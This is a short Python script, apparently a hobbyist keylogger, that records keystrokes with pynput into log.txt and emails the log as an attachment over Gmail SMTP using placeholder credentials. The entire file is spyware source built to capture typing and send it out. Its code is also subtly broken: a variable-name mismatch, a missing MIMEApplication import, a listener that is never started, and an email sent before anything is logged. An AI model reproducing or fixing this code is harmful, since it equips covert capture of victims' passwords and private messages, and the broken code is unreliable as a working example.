#import library for keylogger
import pynput
from pynput.keyboard import Key, Listener

#import library for email feature
import smtplib
from email.mime.text import MIMEText

count = 0
Keys = []

#create session for email feature
s = smtplib.SMTP('smtp.gmail.com', 587)

#start TLS security feature
s.starttls()

#email login
s.login('abcdefg@gmail.com','password')

def on_press(key):
    global keys, count

    keys.append (key)
    count += 1

    if count >= 10:
        count =0
        write_file(keys)
        keys = []

def write_file(keys):
    with open ("log.txt", "a") as f:
        for key in keys:
            k = str(key) .replace ("'","")
            if k.find ("space") > 0:
                f.write ('\n')
            elif k.find("Key") == -1:
                f.write(k)



def on_release(key):
    if key == Key.esc:
        return False

#set email message format
msg = MIMEText('This is the keylogger file.')
msg['Subject'] = 'Keylogger file'

#attach log.txt file to email
etcFileName = 'log.txt'
with open(etcFileName, 'rb') as etcFD : 
    etcPart = MIMEApplication( etcFD.read() )

    #add attached file's info to the header
    etcPart.add_header('Content-Disposition','attachment', filename=etcFileName)
    msg.attach(etcPart) 

#send email
s.sendmail("fro_email_address@gmail.com", "to_email_address@gmail.com", msg.as_string())

#quit session
s.quit()
